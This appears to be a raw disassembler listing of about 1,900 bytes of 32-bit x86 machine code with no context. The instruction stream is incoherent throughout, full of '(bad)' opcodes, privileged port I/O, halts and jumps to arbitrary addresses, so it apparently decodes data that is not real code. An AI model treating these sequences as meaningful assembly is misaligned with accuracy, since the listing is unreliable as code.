  4203e8:	xlat   BYTE PTR ds:[ebx]
  4203e9:	xchg   DWORD PTR [eax+0x4c],edi
  4203ec:	dec    edi
  4203ed:	aas    
  4203ee:	popa   
  4203ef:	mov    bl,0x81
  4203f1:	xchg   edi,eax
  4203f2:	int3   
  4203f3:	jg     0x420443
  4203f5:	lods   eax,DWORD PTR ss:[esi]
  4203f7:	retf   
  4203f8:	imul   DWORD PTR [ebx-0x525b763b]
  4203fe:	dec    esp
  4203ff:	nop
  420400:	retf   
  420401:	or     cl,bl
  420403:	jl     0x420444
  420405:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420406:	mov    edx,0x61442336
  42040b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42040c:	jne    0x420413
  42040e:	mov    eax,0x448be042
  420413:	jo     0x420422
  420415:	mov    al,BYTE PTR [ebp-0x5]
  420418:	cmp    DWORD PTR [edi],esp
  42041a:	stos   BYTE PTR es:[edi],al
  42041b:	test   al,0x42
  42041d:	pushf  
  42041e:	fcomp  DWORD PTR ds:0x5fb6497a
  420424:	lods   eax,DWORD PTR ds:[esi]
  420425:	aad    0x23
  420427:	dec    ebx
  420428:	call   0xb868fa7f
  42042d:	jbe    0x4203f4
  42042f:	clc    
  420430:	xchg   edi,eax
  420431:	(bad)  
  420432:	sbb    eax,0xe7819508
  420437:	out    0xc4,al
  420439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42043a:	cli    
  42043b:	inc    ebx
  42043c:	adc    edi,DWORD PTR [ebp-0x16f579c1]
  420442:	int3   
  420443:	(bad)  
  420444:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420445:	popa   
  420446:	in     eax,0x86
  420448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420449:	jb     0x4204c7
  42044b:	pop    ebp
  42044c:	lods   eax,DWORD PTR ds:[esi]
  42044d:	hlt    
  42044e:	and    al,0x24
  420450:	xchg   edi,eax
  420451:	fwait
  420452:	jmp    0x42045f
  420454:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420455:	(bad)  
  420457:	cmp    esp,DWORD PTR [esi-0x31850fe2]
  42045d:	mov    eax,ds:0xf453361e
  420462:	adc    BYTE PTR [eax+edx*2],dl
  420465:	imul   BYTE PTR [esi]
  420467:	add    eax,0xea9663c7
  42046c:	xchg   ebx,eax
  42046d:	lds    eax,FWORD PTR [edi+0x1ebd747d]
  420473:	out    0x4a,eax
  420475:	stos   BYTE PTR es:[edi],al
  420476:	push   edx
  420477:	or     esi,esi
  420479:	sub    eax,0xc8e8c743
  42047e:	in     al,dx
  42047f:	xchg   ecx,eax
  420480:	sub    BYTE PTR [ebx+0x2f],cl
  420483:	dec    esp
  420484:	aas    
  420485:	xor    al,0x92
  420487:	jg     0x4204e7
  420489:	sub    ch,BYTE PTR [eax*1+0x7ef1e2b7]
  420490:	push   ebx
  420491:	hlt    
  420492:	sti    
  420493:	adc    ah,bl
  420495:	test   DWORD PTR [edx+0x3fd5710b],esi
  42049b:	int3   
  42049c:	jno    0x420513
  42049e:	inc    ecx
  42049f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204a0:	sub    dh,al
  4204a2:	adc    bl,cl
  4204a4:	adc    DWORD PTR [ebx],0xbef341fe
  4204aa:	push   es
  4204ab:	ror    BYTE PTR [ecx],cl
  4204ad:	je     0x4204be
  4204af:	xchg   edx,eax
  4204b0:	outs   dx,BYTE PTR ds:[esi]
  4204b1:	(bad)  
  4204b2:	rcl    DWORD PTR [esi+0x18f0b3cb],cl
  4204b8:	push   edi
  4204b9:	ret    0x5385
  4204bc:	pop    ecx
  4204bd:	mov    ebp,0x63fd4bb4
  4204c2:	or     ebp,0x64d26fb3
  4204c8:	in     al,0x99
  4204ca:	cmp    eax,0xcd40b36d
  4204cf:	push   0x44a903d
  4204d4:	retf   0x2fc3
  4204d7:	pop    ebx
  4204d8:	mov    eax,ds:0xd7cd665e
  4204dd:	daa    
  4204de:	sahf   
  4204df:	nop
  4204e0:	fistp  WORD PTR [eax]
  4204e2:	in     eax,dx
  4204e3:	pusha  
  4204e4:	in     eax,dx
  4204e5:	sbb    eax,0xe18443b1
  4204ea:	stos   BYTE PTR es:[edi],al
  4204eb:	js     0x420481
  4204ed:	hlt    
  4204ee:	pusha  
  4204ef:	fsubp  st(2),st
  4204f1:	stos   BYTE PTR es:[edi],al
  4204f2:	das    
  4204f3:	and    ebp,DWORD PTR [eax-0x46ba2dae]
  4204f9:	mov    eax,ds:0xa2865c53
  4204fe:	int    0xb1
  420500:	sar    DWORD PTR [edx-0x1ff1bf95],0xbc
  420507:	es stos DWORD PTR es:[edi],eax
  420509:	lods   eax,DWORD PTR ds:[esi]
  42050a:	(bad)  
  42050b:	sub    ebx,DWORD PTR [edx+0x39]
  42050e:	sahf   
  42050f:	jnp    0x42055a
  420511:	add    eax,0xb4d16d62
  420516:	sub    BYTE PTR [esi-0x2c],al
  420519:	mov    eax,ds:0x5f04d992
  42051e:	fcom   QWORD PTR ds:0xfa829590
  420524:	add    edi,DWORD PTR [eax]
  420526:	call   0x81a23b92
  42052b:	ins    DWORD PTR es:[edi],dx
  42052c:	and    al,0x3d
  42052e:	jo     0x4204f4
  420530:	and    al,0x11
  420532:	or     bl,BYTE PTR ds:0x1cde8ddd
  420538:	neg    DWORD PTR [edi+0x31ec40ef]
  42053e:	mov    edx,0x33c6c351
  420543:	sbb    edi,DWORD PTR [ecx]
  420545:	lahf   
  420546:	cld    
  420547:	mov    esi,0x10d88533
  42054c:	mov    cl,0xea
  42054e:	cmp    BYTE PTR [edx-0x19e272d7],al
  420554:	cwde   
  420555:	mov    ch,0xa8
  420557:	sbb    eax,0x720cafe4
  42055c:	popf   
  42055d:	sub    bl,dl
  42055f:	cmp    esp,DWORD PTR gs:[eax]
  420562:	(bad)  
  420563:	stos   DWORD PTR es:[edi],eax
  420564:	inc    ebp
  420565:	sbb    bl,BYTE PTR [eax]
  420567:	xchg   ebp,eax
  420568:	std    
  420569:	out    dx,eax
  42056a:	mov    bh,0xde
  42056c:	mov    dl,0x1d
  42056e:	adc    eax,ebx
  420570:	leave  
  420571:	push   esi
  420572:	jecxz  0x4205b8
  420574:	repnz add DWORD PTR gs:[edx-0x2a],0x40
  42057a:	mov    ds:0xda79ffcd,eax
  42057f:	and    ecx,DWORD PTR [edx]
  420581:	push   es
  420582:	imul   eax,DWORD PTR [ecx+0x548661f],0x685c7b4c
  42058c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42058d:	mov    cl,0xd4
  42058f:	lods   eax,DWORD PTR ds:[esi]
  420590:	ss pop ss
  420592:	fst    QWORD PTR [ebp+0x4eb0d59]
  420598:	inc    esi
  420599:	inc    edi
  42059a:	rcl    DWORD PTR ds:0xcd131dc6,0xe3
  4205a1:	iret   
  4205a2:	imul   ecx,DWORD PTR [edx],0xffffffde
  4205a5:	jge    0x420610
  4205a7:	adc    al,0x51
  4205a9:	sbb    ebp,eax
  4205ab:	and    eax,DWORD PTR [edx]
  4205ad:	and    ecx,DWORD PTR [edx+0x7d]
  4205b0:	xor    ecx,DWORD PTR [edx+eiz*8-0x79]
  4205b4:	rol    DWORD PTR [ebx+0x6a30b219],0xb7
  4205bb:	arpl   dx,cx
  4205bd:	dec    edx
  4205be:	xor    al,0xd0
  4205c0:	push   ecx
  4205c1:	ds push ecx
  4205c3:	adc    DWORD PTR [esp+esi*8],edi
  4205c6:	or     edx,edx
  4205c8:	pusha  
  4205c9:	in     eax,dx
  4205ca:	xchg   esi,eax
  4205cb:	push   ss
  4205cc:	xchg   ebx,eax
  4205cd:	ss jle 0x4205c8
  4205d0:	fwait
  4205d1:	icebp  
  4205d2:	mov    dl,0xde
  4205d4:	or     ebx,0x479ca103
  4205da:	fdivr  QWORD PTR ds:0x4aa819d3
  4205e0:	mov    esp,0xf5e41ced
  4205e5:	pusha  
  4205e6:	push   ecx
  4205e7:	add    esi,edi
  4205e9:	nop    DWORD PTR [edi-0x23]
  4205ed:	aam    0xab
  4205ef:	sbb    al,0xa
  4205f1:	cs into 
  4205f3:	inc    ebx
  4205f4:	aad    0x62
  4205f6:	sahf   
  4205f7:	pop    ebx
  4205f8:	stc    
  4205f9:	popf   
  4205fa:	jmp    0x42061d
  4205fc:	mov    dl,0xfb
  4205fe:	lss    edi,FWORD PTR [eax+0x2e]
  420602:	mov    cl,0x7e
  420604:	dec    ebx
  420605:	or     dh,BYTE PTR [esi]
  420607:	je     0x42060d
  420609:	out    dx,al
  42060a:	sbb    DWORD PTR [edx-0x66b4dbf0],0x19
  420611:	jmp    FWORD PTR [edx-0x8]
  420614:	scas   al,BYTE PTR es:[edi]
  420615:	dec    ebx
  420616:	cmp    DWORD PTR ds:0xea33a196,esp
  42061c:	mov    ebx,0x56322638
  420621:	rol    dl,0x52
  420624:	imul   ebp,esi,0x16
  420627:	or     esi,DWORD PTR [esi]
  420629:	das    
  42062a:	push   ebp
  42062b:	cmp    ch,BYTE PTR [ebx+0x41d6df92]
  420631:	sub    esp,0x71
  420634:	xchg   ebp,eax
  420635:	out    0x6f,al
  420637:	cli    
  420638:	mov    eax,ds:0x1cc83c97
  42063d:	push   ss
  42063e:	ret    0x7817
  420641:	test   al,0x38
  420643:	sbb    DWORD PTR [esp+eiz*8],eax
  420646:	data16 jne 0x42064f
  420649:	xor    esp,ebp
  42064b:	sub    eax,0x247a8f83
  420650:	aaa    
  420651:	pop    ecx
  420652:	mov    DWORD PTR [bx+0x26],ecx
  420656:	dec    esp
  420657:	in     eax,0x1f
  420659:	pusha  
  42065a:	xor    eax,0x8d628347
  42065f:	fwait
  420660:	and    al,BYTE PTR [edi-0x4a]
  420663:	fs dec edx
  420665:	repnz into 
  420667:	add    eax,0x1c37369
  42066c:	add    BYTE PTR [edx+0x7b],dh
  42066f:	ja     0x4206a3
  420671:	jg     0x420624
  420673:	jbe    0x4206bf
  420675:	mov    al,ds:0x93a4b493
  42067a:	in     al,0xa2
  42067c:	jbe    0x420605
  42067e:	sub    ebp,DWORD PTR [ebx+0xa]
  420681:	sbb    esi,eax
  420683:	or     esi,DWORD PTR [ecx]
  420685:	scas   al,BYTE PTR es:[edi]
  420686:	push   ss
  420687:	push   0x5c
  420689:	xchg   edx,eax
  42068a:	add    DWORD PTR [ecx-0x48],esp
  42068d:	xor    BYTE PTR [ebx+edx*1+0x75],cl
  420691:	lods   eax,DWORD PTR ds:[esi]
  420692:	ja     0x4206cf
  420694:	jecxz  0x4206d4
  420696:	mov    dl,BYTE PTR [ebx-0xd]
  420699:	stos   DWORD PTR es:[edi],eax
  42069a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42069b:	daa    
  42069c:	outs   dx,DWORD PTR ds:[esi]
  42069d:	pop    edi
  42069e:	mov    esi,0xea24f5c8
  4206a3:	push   edi
  4206a4:	leave  
  4206a5:	xchg   ebx,eax
  4206a6:	ins    BYTE PTR es:[edi],dx
  4206a7:	dec    ecx
  4206a8:	outs   dx,DWORD PTR ds:[esi]
  4206a9:	adc    DWORD PTR [edx-0xc6f5b4c],ecx
  4206af:	lods   al,BYTE PTR ds:[esi]
  4206b0:	in     al,0x6a
  4206b2:	inc    cx
  4206b4:	and    DWORD PTR [ecx],ebp
  4206b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206b7:	cmp    al,BYTE PTR [edi+eax*2+0x35]
  4206bb:	jae    0x4206dc
  4206bd:	sbb    BYTE PTR [edi+0xe80e4],dl
  4206c3:	out    dx,eax
  4206c4:	pop    edx
  4206c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206c6:	mov    esi,0x36a737d
  4206cb:	xchg   esi,eax
  4206cc:	inc    ecx
  4206cd:	sbb    bh,BYTE PTR [esi-0x79]
  4206d0:	hlt    
  4206d1:	dec    eax
  4206d2:	enter  0x9721,0x5b
  4206d6:	outs   dx,BYTE PTR ds:[esi]
  4206d7:	sbb    ecx,DWORD PTR ds:0xa5c57d5a
  4206dd:	icebp  
  4206de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206df:	outs   dx,DWORD PTR ds:[esi]
  4206e0:	stos   DWORD PTR es:[edi],eax
  4206e1:	ret    0xb202
  4206e4:	mov    ebx,ebx
  4206e6:	sar    bh,0x3e
  4206e9:	and    edi,DWORD PTR ss:[ebx]
  4206ec:	scas   al,BYTE PTR es:[edi]
  4206ed:	jbe    0x42076b
  4206ef:	inc    esi
  4206f0:	test   al,0xc0
  4206f2:	mov    ch,0xc6
  4206f4:	push   es
  4206f5:	movups xmm3,xmm3
  4206f8:	mov    dh,0xf7
  4206fa:	or     BYTE PTR [ebx+0x41],ah
  4206fd:	mov    bl,0xe
  4206ff:	jmp    0x694a62d5
  420704:	ud2    
  420706:	dec    ebx
  420707:	test   eax,0x12f3cda9
  42070c:	push   cs
  42070d:	out    dx,al
  42070e:	icebp  
  42070f:	dec    ebx
  420710:	ret    0x77ec
  420713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420714:	xchg   edx,eax
  420715:	add    al,0x92
  420717:	push   0x11d8c556
  42071c:	mov    edx,0xfc2f4d37
  420721:	jmp    0x42076b
  420723:	enter  0xd95e,0xe3
  420727:	(bad)  
  420728:	mov    bl,0x49
  42072a:	mov    ebx,DWORD PTR [ebp+0x46]
  42072d:	clc    
  42072e:	mov    al,0xfd
  420730:	sbb    DWORD PTR [ebx-0x73],ebp
  420733:	mov    ah,0x3
  420735:	out    0x26,eax
  420737:	mov    esp,0x3edf8d58
  42073c:	repnz and al,0x73
  42073f:	add    eax,0x12724472
  420744:	retf   0xabf6
  420747:	mov    eax,edi
  420749:	out    dx,al
  42074a:	rcr    DWORD PTR [ecx],cl
  42074c:	xlat   BYTE PTR ds:[ebx]
  42074d:	xchg   edx,eax
  42074e:	cld    
  42074f:	pop    ebp
  420750:	jns    0x420768
  420752:	popa   
  420753:	icebp  
  420754:	(bad)  
  420755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420756:	std    
  420757:	mov    ebp,0xf94f0865
  42075c:	sar    BYTE PTR [edi+ebp*1-0x6],1
  420760:	mov    ds:0xaa41a19,al
  420765:	or     esp,0xffffffcc
  420768:	das    
  420769:	cmp    ch,BYTE PTR [ecx]
  42076b:	adc    ah,BYTE PTR ds:0xd0325268
  420771:	cwde   
  420772:	call   0x8198cdc
  420777:	(bad)  
  420778:	mov    esi,DWORD PTR [edx+esi*8+0xc]
  42077c:	rol    BYTE PTR [edi-0x49],0x9d
  420780:	(bad)  
  420781:	fimul  DWORD PTR [ecx-0x6bbc02b]
  420787:	jo     0x4207cb
  420789:	pop    esi
  42078a:	jnp    0xff3e6c75
  420790:	lea    esi,[ecx]
  420792:	add    al,0x41
  420794:	xor    BYTE PTR [esi+0x60],bh
  420797:	pop    eax
  420798:	inc    edi
  420799:	cmp    BYTE PTR [esi],bl
  42079b:	mov    BYTE PTR [eax],0x4a
  42079e:	add    esi,ebp
  4207a0:	mov    ebx,0x32cf72c4
  4207a5:	pop    es
  4207a6:	add    bl,BYTE PTR [ecx+0x7b]
  4207a9:	scas   al,BYTE PTR es:[edi]
  4207aa:	pop    esi
  4207ab:	and    bl,BYTE PTR [eax+0x53072c3e]
  4207b1:	(bad)  [esi+0x64]
  4207b4:	ret    0xc03c
  4207b7:	ins    DWORD PTR es:[edi],dx
  4207b8:	arpl   WORD PTR [ebp-0x33ee0299],cx
  4207be:	(bad)  
  4207bf:	les    ebp,FWORD PTR [ebp-0x6db65f2e]
  4207c5:	pop    ds
  4207c6:	add    ebp,DWORD PTR [esp+edx*8+0x2c2f4d33]
  4207cd:	sbb    ah,BYTE PTR [ebp+0xed27595]
  4207d3:	lock ror dh,1
  4207d6:	jno    0x420801
  4207d8:	jno    0x420791
  4207da:	inc    ebx
  4207db:	daa    
  4207dc:	sbb    ebx,DWORD PTR [eax+0x2]
  4207df:	call   0xf70f:0xeb4f0cd9
  4207e6:	sub    eax,0x7bdd07a5
  4207eb:	mov    bh,0xeb
  4207ed:	scas   al,BYTE PTR es:[edi]
  4207ee:	xor    al,0x2c
  4207f0:	push   ds
  4207f1:	imul   ebx,ebx,0x194b8a72
  4207f7:	dec    esp
  4207f8:	mov    ecx,0xc7272fe3
  4207fd:	in     al,dx
  4207fe:	add    BYTE PTR [edx+eax*2-0x2b4615bf],0x3d
  420806:	and    eax,0x8126cd1d
  42080b:	sbb    esi,0x956e5945
  420811:	and    bh,BYTE PTR [ebp-0x8]
  420814:	add    al,0xb5
  420816:	or     DWORD PTR ds:0xf27c87be,edx
  42081c:	xchg   BYTE PTR [esi-0x59],ah
  42081f:	sbb    bh,BYTE PTR [ebp-0x71]
  420822:	iret   
  420823:	pop    edx
  420824:	repnz dec edi
  420826:	sar    BYTE PTR [esi-0x43],1
  420829:	jbe    0x4207e7
  42082b:	mov    edx,0x63927c91
  420830:	sbb    dl,BYTE PTR [ebx-0x75]
  420833:	push   esp
  420834:	fdiv   DWORD PTR ds:0x91f23dd1
  42083a:	fdivr  DWORD PTR [ebp+0x42eda356]
  420840:	enter  0x7cda,0xfc
  420844:	mov    al,0xdf
  420846:	xlat   BYTE PTR ds:[ebx]
  420847:	inc    esi
  420848:	xor    eax,0xc37bf3c3
  42084d:	jmp    0x420827
  42084f:	mov    al,BYTE PTR [esi]
  420851:	shl    ebx,0x75
  420854:	call   DWORD PTR [edi]
  420856:	xchg   ebx,eax
  420857:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420858:	jg     0x420894
  42085a:	fmul   QWORD PTR [eax+0x1c6c553e]
  420860:	pop    DWORD PTR [eax+0x7024d67]
  420866:	mov    ah,0xc8
  420868:	mov    bl,BYTE PTR ds:[ebx+0x234f86d9]
  42086f:	jbe    0x42087b
  420871:	xor    BYTE PTR [ebx-0x10],bh
  420874:	push   es
  420875:	and    eax,0x9888cb8
  42087a:	mov    ebp,cs
  42087c:	out    0x4d,eax
  42087e:	pop    ebx
  42087f:	xchg   esi,eax
  420880:	repz ret 0x2abb
  420884:	mov    dl,0xd6
  420886:	mov    ch,BYTE PTR [ecx-0x1046c489]
  42088c:	jbe    0x42080f
  42088e:	cmp    dh,BYTE PTR [edx+0x62]
  420891:	sbb    eax,0x1af35996
  420896:	iret   
  420897:	push   es
  420898:	mov    BYTE PTR [edi-0x612db9cb],ah
  42089e:	pop    ebx
  42089f:	sbb    edi,DWORD PTR [ebp+ebp*1+0x75]
  4208a3:	sub    ecx,esi
  4208a5:	adc    BYTE PTR ss:[ecx-0x3b8476a],ah
  4208ac:	out    dx,eax
  4208ad:	xchg   ecx,eax
  4208ae:	add    eax,0x52f7d04b
  4208b3:	dec    edx
  4208b4:	push   cs
  4208b5:	and    DWORD PTR ds:0xe6b8f84b,esp
  4208bb:	add    BYTE PTR [ebp+0x2af2a5fa],bh
  4208c1:	dec    edi
  4208c2:	pop    esi
  4208c3:	add    eax,0x62dc6d7b
  4208c8:	test   DWORD PTR [edi+0x4e],eax
  4208cb:	xchg   esi,eax
  4208cc:	daa    
  4208cd:	jmp    0xad81832d
  4208d2:	cmp    ah,bl
  4208d4:	sbb    cl,BYTE PTR [ecx]
  4208d6:	popa   
  4208d7:	cmp    DWORD PTR [edi+0x733d5fd5],0xffffffbf
  4208de:	push   ecx
  4208df:	inc    esp
  4208e0:	pop    ebp
  4208e1:	sub    al,0x77
  4208e3:	nop
  4208e4:	mov    edx,ss
  4208e6:	(bad)  
  4208e7:	ffreep st(1)
  4208e9:	(bad)  
  4208ea:	mov    eax,0x4e1266f9
  4208ef:	test   BYTE PTR [edi-0x7da6d27e],bh
  4208f5:	sbb    ecx,DWORD PTR [edx+0x9]
  4208f8:	jb     0x4208e5
  4208fa:	shl    BYTE PTR [eax-0x200fab12],1
  420900:	test   BYTE PTR [edi+0xa],0x7c
  420904:	xchg   esi,eax
  420905:	call   0xbce98487
  42090a:	sub    eax,0x845037e3
  42090f:	or     esi,DWORD PTR [edx]
  420911:	sub    BYTE PTR ds:0x1736543b,ch
  420917:	pop    eax
  420918:	iret   
  420919:	adc    al,ah
  42091b:	dec    ebp
  42091c:	loop   0x420917
  42091e:	dec    esi
  42091f:	mov    bl,0xf0
  420921:	push   0xd05461df
  420926:	cmp    al,0x3e
  420928:	xchg   ebp,eax
  420929:	leave  
  42092a:	mov    edi,0x7dd98c04
  42092f:	dec    esp
  420930:	cmp    DWORD PTR [ecx+0x1aeb293b],eax
  420936:	inc    eax
  420937:	jne    0x4208c4
  420939:	imul   eax,eax,0x6809620e
  42093f:	call   0x534bde91
  420944:	xchg   ecx,eax
  420945:	hlt    
  420946:	fisttp QWORD PTR [edi]
  420948:	jno    0x420963
  42094a:	test   BYTE PTR [edi],dl
  42094c:	call   0x1a01:0x74b95139
  420953:	pop    esp
  420954:	and    dh,BYTE PTR [edx+0x66]
  420957:	push   ds
  420958:	ss mov ebp,0xcd526649
  42095e:	ins    BYTE PTR es:[edi],dx
  42095f:	in     eax,dx
  420960:	mov    al,BYTE PTR [edi]
  420962:	inc    ebp
  420963:	and    eax,0x988ace54
  420968:	jne    0x4209e1
  42096a:	or     al,0xcd
  42096c:	test   eax,0xf6a61aea
  420971:	mov    BYTE PTR [eax-0xb],al
  420974:	xchg   BYTE PTR [ebx],ah
  420976:	add    al,0x42
  420978:	add    DWORD PTR [esi],ecx
  42097a:	pop    es
  42097b:	icebp  
  42097c:	inc    edx
  42097d:	dec    ecx
  42097e:	sub    eax,DWORD PTR [eax]
  420980:	jbe    0x42098a
  420982:	dec    edx
  420983:	adc    BYTE PTR [esi-0x3c5a9f9b],0x86
  42098a:	fiadd  DWORD PTR [esi+0x7fc8744d]
  420990:	jo     0x4209a6
  420992:	cmp    al,0xf4
  420994:	jno    0x4209ab
  420996:	fs rol al,1
  420999:	xor    edi,ebp
  42099b:	rcr    DWORD PTR [eax+0x7e],cl
  42099e:	inc    ebx
  42099f:	pop    ecx
  4209a0:	pop    eax
  4209a1:	ds inc ebp
  4209a3:	(bad)  
  4209a4:	jmp    0x4209ae
  4209a6:	int3   
  4209a7:	dec    ebx
  4209a8:	fistp  DWORD PTR [ebx+0x5f]
  4209ab:	retf   0xb0ed
  4209ae:	mov    al,ds:0x3871eb6b
  4209b3:	es test eax,0x42e84016
  4209b9:	clc    
  4209ba:	icebp  
  4209bb:	push   0x81d0af92
  4209c0:	(bad)  
  4209c1:	sub    al,0xa4
  4209c3:	jecxz  0x4209fa
  4209c5:	mov    edx,0xfb636042
  4209ca:	jo     0x420a14
  4209cc:	clc    
  4209cd:	mov    esi,0x2e9f1ef6
  4209d2:	pop    ss
  4209d3:	cmp    al,0xd4
  4209d5:	adc    ch,dh
  4209d7:	dec    eax
  4209d8:	cld    
  4209d9:	inc    eax
  4209da:	xchg   edx,eax
  4209db:	out    dx,al
  4209dc:	dec    ecx
  4209dd:	jnp    0x420965
  4209df:	and    bl,bh
  4209e1:	cmp    eax,DWORD PTR [edi-0x1e36329f]
  4209e7:	add    DWORD PTR [edx],ecx
  4209e9:	sahf   
  4209ea:	shl    DWORD PTR [ecx],cl
  4209ec:	fwait
  4209ed:	add    DWORD PTR [ecx-0x56],eax
  4209f0:	xchg   esp,eax
  4209f1:	pusha  
  4209f2:	les    ebx,FWORD PTR [ebp+0x5e334940]
  4209f8:	dec    edx
  4209f9:	test   DWORD PTR [ebp-0xd],ebp
  4209fc:	mov    WORD PTR [edi+0x221f42d6],?
  420a02:	out    dx,al
  420a03:	and    al,0x29
  420a05:	in     al,dx
  420a06:	mov    ecx,0xe0b510b7
  420a0b:	add    al,0x3d
  420a0d:	call   0x7870bc53
  420a12:	jo     0x4209f8
  420a14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a15:	mov    bl,0x80
  420a17:	icebp  
  420a18:	inc    ebp
  420a19:	in     al,0xa9
  420a1b:	dec    ebx
  420a1c:	adc    edi,DWORD PTR [ebx]
  420a1e:	xor    BYTE PTR [edx-0x5b],cl
  420a21:	(bad)  
  420a22:	mov    edx,0x9fbdb191
  420a27:	add    ah,BYTE PTR [eax+0x11]
  420a2a:	jnp    0x4209c2
  420a2c:	mov    ah,0x27
  420a2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a2f:	inc    edx
  420a30:	retf   
  420a31:	xor    bh,BYTE PTR [esp]
  420a34:	jl     0x420a39
  420a36:	mov    dh,0x5
  420a38:	stos   DWORD PTR es:[edi],eax
  420a39:	sbb    bl,al
  420a3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a3c:	fs out 0xbd,eax
  420a3f:	outs   dx,DWORD PTR ds:[esi]
  420a40:	mov    eax,0x5fd5b3a0
  420a45:	pop    ecx
  420a46:	inc    edi
  420a47:	je     0x420aa5
  420a49:	in     eax,0xb4
  420a4b:	add    al,0x6f
  420a4d:	dec    ebp
  420a4e:	idiv   BYTE PTR [ebx-0x7888f47d]
  420a54:	lods   al,BYTE PTR ds:[esi]
  420a55:	jb     0x4209e3
  420a57:	xor    ebx,ecx
  420a59:	scas   al,BYTE PTR es:[edi]
  420a5a:	(bad)  
  420a5c:	inc    ebp
  420a5d:	add    BYTE PTR [ecx-0x74],0xe8
  420a61:	clc    
  420a62:	jmp    0xcb6d:0x85abc284
  420a69:	pop    eax
  420a6a:	dec    edi
  420a6b:	aas    
  420a6c:	dec    esi
  420a6d:	je     0x420a3c
  420a6f:	sti    
  420a70:	(bad)  
  420a71:	add    esi,DWORD PTR [edx]
  420a73:	lods   eax,DWORD PTR ds:[esi]
  420a74:	int    0x59
  420a76:	xchg   ecx,eax
  420a77:	xor    esi,ecx
  420a79:	add    ch,0x94
  420a7c:	jbe    0x420af1
  420a7e:	inc    edi
  420a7f:	xchg   BYTE PTR [esi+0x481bf7f3],al
  420a85:	or     BYTE PTR [ecx-0x2e],ch
  420a88:	ficomp WORD PTR [edx+0xcb93190]
  420a8e:	rol    BYTE PTR [esp+ebp*8+0x5015b8ac],cl
  420a95:	mov    edi,0xbb909f84
  420a9a:	push   ebx
  420a9b:	std    
  420a9c:	popa   
  420a9d:	jae    0x420a4a
  420a9f:	out    0x6c,eax
  420aa1:	or     ecx,DWORD PTR [edx-0x6c21cbc]
  420aa7:	sub    ecx,DWORD PTR ds:[ebp-0x2ef39f64]
  420aae:	mov    sp,0x499f
  420ab2:	das    
  420ab3:	call   0xb810:0xc920017b
  420aba:	int3   
  420abb:	or     al,0xf1
  420abd:	dec    edi
  420abe:	sub    edi,0xffffffcf
  420ac1:	test   eax,0x9fc2ebdd
  420ac6:	repnz test al,0x29
  420ac9:	and    esi,DWORD PTR [edx]
  420acb:	cli    
  420acc:	test   al,0xe3
  420ace:	dec    ebx
  420acf:	popa   
  420ad0:	gs cmp eax,0x65ece005
  420ad6:	sub    DWORD PTR [edx+0x4735e678],ebp
  420adc:	(bad)  
  420add:	adc    cl,BYTE PTR [edx-0x49]
  420ae0:	sti    
  420ae1:	inc    ebp
  420ae2:	clc    
  420ae3:	and    BYTE PTR [ebp-0xefc5d25],ch
  420ae9:	xor    DWORD PTR [edx],ebx
  420aeb:	inc    esi
  420aec:	add    BYTE PTR [ebp-0x3adcb949],ch
  420af2:	mov    bh,0xb4
  420af4:	cli    
  420af5:	stc    
  420af6:	add    BYTE PTR [edx+0x15b8891d],cl
  420afc:	or     ah,ah
  420afe:	mov    esi,0x3662302
  420b03:	cmp    cl,BYTE PTR [edi-0x70]
  420b06:	mov    ebx,0x550284f3
  420b0b:	push   esp
  420b0c:	sbb    ebp,edi
  420b0e:	push   ebx
  420b0f:	push   ebx
  420b10:	into   
  420b11:	xor    al,0x6
  420b13:	inc    esp
  420b14:	pushf  
  420b15:	js     0x420b69
  420b17:	adc    eax,0x3e75ade0
  420b1c:	rcl    DWORD PTR [ebx-0x2d],0x8c
  420b20:	mov    cl,0x10
  420b22:	inc    eax
  420b23:	or     DWORD PTR [edi+0x6],ebx
  420b26:	xchg   ebx,eax
  420b27:	int    0x39
  420b29:	enter  0xfe0,0x74
  420b2d:	bound  ebx,QWORD PTR [ebp-0x30]
  420b30:	mov    edi,0x22865dad
  420b35:	or     eax,0x28ab527b
  420b3a:	jmp    FWORD PTR [edx+ebx*2+0x5794ec22]
  420b41:	inc    edi
  420b42:	dec    ebp
  420b43:	inc    edi
  420b44:	rol    DWORD PTR [edi+edx*1-0x663ab30c],cl
  420b4b:	lods   eax,DWORD PTR ds:[esi]
  420b4c:	jle    0x420b1d
  420b4e:	cli    
  420b4f:	(bad)  
  420b51:	loopne 0x420b6f
  420b53:	es in  eax,dx
  420b55:	in     eax,dx
  420b56:	push   esi
  420b57:	xor    eax,0xf758c642
  420b5c:	rcr    BYTE PTR [eax+0xea84182],1
  420b62:	std    
  420b63:	xchg   edi,eax
  420b64:	retf   
  420b65:	or     eax,0x90bf80d6
  420b6a:	fisubr WORD PTR es:[edi+0x42]
  420b6e:	sbb    bp,cx
  420b71:	outs   dx,DWORD PTR cs:[esi]
  420b73:	xchg   ebp,eax
  420b74:	out    0xa3,eax
  420b76:	in     al,0x84
  420b78:	mov    eax,0x730eb995
  420b7d:	pop    ebx
  420b7e:	pop    ebx
  420b7f:	icebp  
  420b80:	sbb    eax,0xece043db
  420b85:	leave  
  420b86:	push   ebx
  420b87:	pop    esi
  420b88:	das    
  420b89:	pusha  
  420b8a:	pop    edi
  420b8b:	push   cs
  420b8c:	rol    cl,1
  420b8e:	add    BYTE PTR [ecx+eax*1-0x45],ah
  420b92:	les    ebx,FWORD PTR [edx]
  420b94:	add    esp,DWORD PTR [ebx+0x7d9b5508]
  420b9a:	lods   al,BYTE PTR ds:[esi]
